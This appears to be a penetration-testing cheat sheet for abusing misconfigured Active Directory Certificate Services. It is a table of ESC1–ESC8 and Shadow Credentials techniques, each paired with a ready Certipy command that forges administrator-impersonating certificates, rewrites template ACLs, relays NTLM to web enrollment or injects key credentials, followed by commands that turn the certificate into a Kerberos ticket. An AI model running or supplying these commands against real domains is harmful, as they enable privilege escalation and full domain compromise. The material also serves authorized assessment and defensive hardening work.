# Active Directory Certificate Services (AD CS) Triage Matrix

Reference parameters for assessing misconfigured certificate templates using Certipy and native Kerberos PKINIT authentication.

## ESC Overview & Assessment Rules

| Technique | Flaw Description | Assessment Command (Linux) | Target Artifact |
| :--- | :--- | :--- | :--- |
| **ESC1** | Client Authentication enabled + `ENROLLEE_SUPPLIES_SUBJECT` flag set. | `certipy req -u 'user@realm' -p 'pass' -target dc.realm -template VulnerableTemplate -ca CA-NAME -upn administrator@realm` | `.pfx` certificate impersonating target UPN |
| **ESC2** | Certificate template defines Any Purpose EKU or no EKU at all. | `certipy req -u 'user@realm' -k -no-pass -target dc.realm -template AnyPurposeTemplate -ca CA-NAME` | `.pfx` usable for arbitrary sub-enrollment |
| **ESC3** | Template defines Certificate Request Agent EKU (Enrollment Agent). | `certipy req -u 'user@realm' -k -target dc.realm -template AgentTemplate -ca CA-NAME -on-behalf-of 'realm\admin'` | Certificate signed on behalf of target |
| **ESC4** | Vulnerable Access Control Lists (ACLs) on the certificate template itself (`WriteDacl`, `WriteOwner`, `GenericAll`). | `certipy template -u 'user@realm' -k -target dc.realm -template TargetTemplate -save-old` | Modified template enabling ESC1 configuration |
| **ESC6** | Certification Authority defines `EDITF_ATTRIBUTESUBJECTALTNAME2` flag (allowing arbitrary SAN across any template). | `certipy req -u 'user@realm' -k -target dc.realm -template User -ca CA-NAME -upn target@realm` | Direct administrator impersonation via standard template |
| **ESC8** | NTLM Relay to AD CS HTTP Web Enrollment endpoints (`/certsrv/`). | `certipy relay -target "http://ca.realm/certsrv/" -template Machine` | Machine account certificate obtained via relay |
| **Shadow Credentials** | Write permissions on target object's `msDS-KeyCredentialLink` attribute. | `certipy shadow auto -u 'operator@realm' -k -no-pass -account 'TARGET_OBJECT$'` | Injects raw public key; requests TGT via PKINIT |

## PKINIT Ticket Retrieval
Once a `.pfx` certificate is obtained, convert to Kerberos Ticket Granting Ticket (TGT) without touching Windows:
```bash
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
export KRB5CCNAME=administrator.ccache
```
